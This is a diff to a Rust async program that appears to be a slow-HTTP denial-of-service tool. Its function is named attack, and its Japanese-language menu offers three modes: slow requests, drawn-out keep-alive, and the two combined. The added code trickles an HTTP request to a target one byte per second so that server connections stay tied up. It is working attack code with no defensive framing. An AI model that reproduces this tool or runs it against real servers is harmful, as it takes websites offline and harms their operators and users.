@@ -5,7 +5,7 @@ extern crate tokio;
 use std::{io::Write, time::Duration};
 
 use tokio::{
-    io::{AsyncReadExt, AsyncWriteExt, BufStream},
+    io::{AsyncReadExt, AsyncWrite, AsyncWriteExt, BufStream},
     sync::RwLock,
     time::sleep,
 };
@@ -37,13 +37,13 @@ async fn main() {
     let mut session = SESSION.write().await;
 
     println!("モードを選んでください");
-    println!("1: 推奨\n2: 1がうまく行かないとき用");
+    println!("1: 低速リクエスト\n2: Keep-Aliveを長引かせる\n3: 1と2の合わせ技");
     print!("> ");
     std::io::stdout().flush().unwrap();
     let mut mode = String::new();
     std::io::stdin().read_line(&mut mode).unwrap();
     let mode: u8 = mode.trim().parse().unwrap();
-    if 2 < mode {
+    if 3 < mode {
         panic!("変な値が入力されたようです");
     } else {
         session.mode = mode;
@@ -102,19 +102,42 @@ async fn attack() {
             }
         });
 
-        if session.mode == 2 {
-            let _ = write.write_all(&session.http_request).await;
+        match session.mode {
+            1 => {
+                mode1(&mut write).await;
+            }
+            2 => {
+                mode2(&mut write).await;
+                loop {
+                    if !mode1(&mut write).await {
+                        break;
+                    }
+                }
+            }
+            3 => loop {
+                if !mode1(&mut write).await {
+                    break;
+                }
+            },
+            _ => (),
         }
 
-        'outer: loop {
-            for i in 0..session.http_request.len() {
-                let _ = write.write_all(&session.http_request[i..i + 1]).await;
-                if write.flush().await.is_err() {
-                    break 'outer;
-                };
-                sleep(Duration::from_secs(1)).await;
-            }
-        }
         receive.abort();
     }
+}
+
+async fn mode1<T: AsyncWrite + std::marker::Unpin>(write: &mut T) -> bool {
+    let session = SESSION.read().await;
+    for i in 0..session.http_request.len() {
+        let _ = write.write_all(&session.http_request[i..i + 1]).await;
+        if write.flush().await.is_err() {
+            return false;
+        };
+        sleep(Duration::from_secs(1)).await;
+    }
+    true
+}
+async fn mode2<T: AsyncWrite + std::marker::Unpin>(write: &mut T) {
+    let session = SESSION.read().await;
+    let _ = write.write_all(&session.http_request).await;
 }
